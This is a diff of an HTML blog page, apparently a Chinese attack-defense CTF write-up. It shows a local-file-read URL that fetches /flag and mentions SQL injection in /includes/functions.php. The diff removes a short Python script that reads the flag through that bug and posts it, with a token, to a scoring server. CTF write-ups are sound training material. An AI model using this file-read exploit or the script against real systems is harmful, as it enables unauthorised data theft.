@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      20
+      18
        分钟
     </span>
   
@@ -239,10 +239,6 @@
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/setup/i</span>ndex.php?step=<span class="hljs-number">5</span>&amp;file=/flag<br></code></pre></td></tr></table></figure>
 
 <p><a href="https://imgtu.com/i/Rl4S2R"><img src="https://z3.ax1x.com/2021/06/25/Rl4S2R.png" srcset="/img/loading.gif" lazyload alt="Rl4S2R.png"></a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span>  re<br><br><br><br>target=<span class="hljs-string">&quot;http://172.35.40.12//setup/index.php?step=5&amp;file=/flag&quot;</span><br>r=requests.get(target)<br><br><br>asd=[]<br>asd=r.text.split(<span class="hljs-string">&quot;\n&quot;</span>)<br>flag=asd[<span class="hljs-number">11</span>].strip(<span class="hljs-string">&quot;\n&quot;</span>)<br>print(asd[<span class="hljs-number">11</span>])<br><br><br>url=<span class="hljs-string">&quot;http://10.16.18.1/api/v1/att_def/web/submit_flag/?event_id=14&quot;</span><br>data=&#123;<span class="hljs-string">&quot;flag&quot;</span>:flag,<span class="hljs-string">&quot;token&quot;</span>:<span class="hljs-string">&quot;u6VWRQ5dECe53fQDR7DbSMVM6St7HuWvYmmMtu5auFVSc&quot;</span>&#125;<br>r=requests.post(url=url,data=data)<br>print(r.text)<br><br></code></pre></td></tr></table></figure>
-
-
-
 <h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>/includes/functions.php</p>
 <p>存在sql注入</p>
 <p><a href="https://imgtu.com/i/Rl4aMq"><img src="https://z3.ax1x.com/2021/06/25/Rl4aMq.png" srcset="/img/loading.gif" lazyload alt="Rl4aMq.png"></a></p>
